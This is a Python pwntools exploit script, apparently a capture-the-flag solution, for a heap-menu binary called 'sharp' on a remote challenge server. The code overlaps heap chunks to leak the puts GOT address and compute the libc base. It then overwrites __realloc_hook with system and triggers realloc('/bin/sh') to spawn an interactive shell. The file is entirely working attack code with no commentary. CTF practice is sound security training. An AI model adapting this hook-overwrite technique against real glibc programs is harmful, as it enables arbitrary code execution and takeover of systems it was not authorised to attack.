#!/usr/bin/python

from pwn import *

PATH = './sharp'

GDBSCRIPT = '''
    source ~/debug/loadsym.py
    set debug-file-directory ~/debug/ubuntu-20.04/dbg64
    loadsym ~/debug/ubuntu-20.04/dbg64/libc-2.31.so
'''

HOST = 'challenge.ctf.games'
PORT = 30915

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def add(user):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', user)

def remove(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', f'{idx}')

def edit(idx, user):
    r.sendlineafter('> ', '3')
    r.sendlineafter('edit: ', f'{idx}')
    r.sendlineafter(': ', user)

def exploit(r):    
    for _ in range(4):
        add(b'A' * 8)
    
    edit(1, b'B' * 0x78 + p64(0x81 + 0x30))
    edit(2, b'C' * 0x78 + p64(0x31) + p64(elf.got['puts']))

    r.sendlineafter('> ', '5')
    
    leak = u64(r.recvline(0).split()[-1].ljust(8, b'\0'))
    libc.address = leak - libc.sym['puts']

    print(hex(leak))
    print(hex(libc.address))
    
    add(b'X' * 8)
    add(b'X' * 8)
    add(b'X' * 8)

    edit(3, b'X' * 0x78 + p64(0x81 + 0x40))
    edit(4, b'F' * 0x78 + p64(0x41) + p64(libc.sym['__realloc_hook']) + p64(libc.sym['__realloc_hook']))

    edit(1, p64(libc.sym['system']))

    edit(4, b'F' * 0x78 + p64(0x41) + b'/bin/sh\0')

    # add user | trigger realloc('/bin/sh')
    r.sendlineafter('> ', '1')
    

    
    # edit(0, p64(libc.sym['system']))


    debug(GDBSCRIPT)

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('./libc-2.31.so', checksec=False)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        env = {'LD_PRELOAD' : './libc-2.31.so'}
        r = process(PATH, aslr=0, env=env)
    exploit(r)